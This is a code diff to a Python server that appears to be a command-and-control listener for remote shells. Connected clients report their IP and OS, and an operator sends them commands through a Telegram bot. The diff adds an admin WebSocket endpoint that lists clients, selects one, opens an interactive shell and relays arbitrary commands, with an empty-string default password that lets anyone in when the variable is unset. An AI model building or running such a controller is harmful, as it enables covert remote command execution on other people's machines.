@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import asyncio
+import json
 import os
 import signal
 import sys
@@ -13,11 +14,13 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 ALLOWED_USERS = [int(x.strip()) for x in os.environ.get("ALLOWED_USERS", "").split(",") if x.strip()]
 LISTENER_PORT = int(os.environ.get("PORT", os.environ.get("LISTENER_PORT", "8080")))
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
 
 clients = {}
 current_client = None
 bot_app = None
 interactive_mode = {}
+admin_connections = set()
 
 
 def log(message):
@@ -149,12 +152,87 @@ async def buffer_flush_loop(client_id):
                 if current_client == client_id:
                     for uid in ALLOWED_USERS:
                         await send_to_telegram(uid, f"```\n{buf.strip()}\n```", parse_mode="Markdown")
+                    for aws in admin_connections.copy():
+                        try:
+                            await aws.send_str(f"output:{buf.strip()}")
+                        except Exception:
+                            admin_connections.discard(aws)
     except asyncio.CancelledError:
         pass
 
 
 async def health_handler(request):
     return web.Response(text="OK")
+
+
+async def admin_ws_handler(request):
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+
+    authed = False
+    interactive = False
+
+    async for msg in ws:
+        if msg.type != WSMsgType.TEXT:
+            continue
+
+        text = msg.data
+
+        if not authed:
+            if text.startswith("auth:") and text[5:] == ADMIN_PASSWORD:
+                authed = True
+                admin_connections.add(ws)
+                await ws.send_str("auth_ok")
+            else:
+                await ws.send_str("auth_err")
+                break
+            continue
+
+        if text == "clients":
+            lst = []
+            for cid, c in clients.items():
+                lst.append({"id": cid, "addr": c["addr"], "info": c["info"], "current": cid == current_client})
+            await ws.send_str(f"clients:{json.dumps(lst)}")
+
+        elif text.startswith("select:"):
+            cid = int(text[7:])
+            if cid in clients:
+                global current_client
+                current_client = cid
+                interactive = False
+                await ws.send_str(f"selected:{cid}")
+            else:
+                await ws.send_str(f"error:Client {cid} not found")
+
+        elif text == "shell":
+            if current_client and current_client in clients:
+                interactive = True
+                await ws.send_str("output:--- interactive mode ---")
+            else:
+                await ws.send_str("error:No client selected")
+
+        elif text == "back":
+            interactive = False
+            await ws.send_str("output:--- exited ---")
+
+        elif text == "info":
+            if current_client and current_client in clients:
+                c = clients[current_client]
+                await ws.send_str(f"output:ID: {current_client} | IP: {c['addr']} | OS: {c['info']}")
+            else:
+                await ws.send_str("error:No client selected")
+
+        else:
+            if current_client and current_client in clients:
+                try:
+                    await clients[current_client]["ws"].send_str(text + "\n")
+                except Exception:
+                    await ws.send_str("error:Failed to send command")
+            else:
+                await ws.send_str("error:No client selected")
+
+    admin_connections.discard(ws)
+    return ws
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -417,6 +495,7 @@ async def run_http_server():
     app = web.Application()
     app.router.add_get("/health", health_handler)
     app.router.add_get("/ws", ws_handler)
+    app.router.add_get("/admin/ws", admin_ws_handler)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", LISTENER_PORT)
